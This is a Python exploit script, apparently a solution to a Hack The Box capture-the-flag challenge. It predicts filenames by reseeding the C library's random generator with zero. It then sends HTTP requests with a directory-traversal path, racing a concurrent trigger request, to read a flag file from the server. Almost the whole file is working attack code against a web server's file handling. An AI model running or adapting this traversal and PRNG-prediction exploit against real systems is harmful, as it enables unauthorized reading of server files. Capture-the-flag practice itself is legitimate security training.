import ctypes
import socket
import threading

libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = [ctypes.c_uint]
libc.rand.restype = ctypes.c_int

def random_hex_c(length: int) -> str:
    return "".join(f"{libc.rand() & 0xff:02x}" for _ in range(length))

def send_request(host, port, message, label, timeout=5):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if timeout: s.settimeout(timeout)
            s.connect((host, port))
            s.sendall(message.encode())
            response = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
                except:
                    break
            if b"HTB{" in response:
                print(f"[!] FLAG FOUND in {label}:\n{response.decode(errors='ignore')}")
                return True
            else:
                print(f"[*] No flag in {label} response>", response.decode(errors='ignore'))
    except Exception as e:
        print(f"[!] Error in {label}: {e}")
    return False


if __name__ == "__main__":
    host = "SERVER_IP"
    port = PORT

    trigger_msg = f"GET /flag.txt HTTP/1.1\r\nHost: {host}\r\n\r\n"
    t = threading.Thread(target=send_request, args=(host, port, trigger_msg, "trigger", 0))
    t.start()
    
    for run_time in range(10):
        libc.srand(0)  # Reset seed each time
        # Advance the random state by run_time+1 times
        for _ in range(run_time + 1):
            hex_val = random_hex_c(8)
        print(f"[*] Trying run_time={run_time}, hex={hex_val}")
        
        # Send exploit request
        exploit_msg = f"GET /stats/{hex_val}_flag.txt/../../../../../../flag.txt HTTP/1.1\r\nHost: {host}\r\n\r\n"
        if send_request(host, port, exploit_msg, "exploit"):
            break  # Stop if flag found
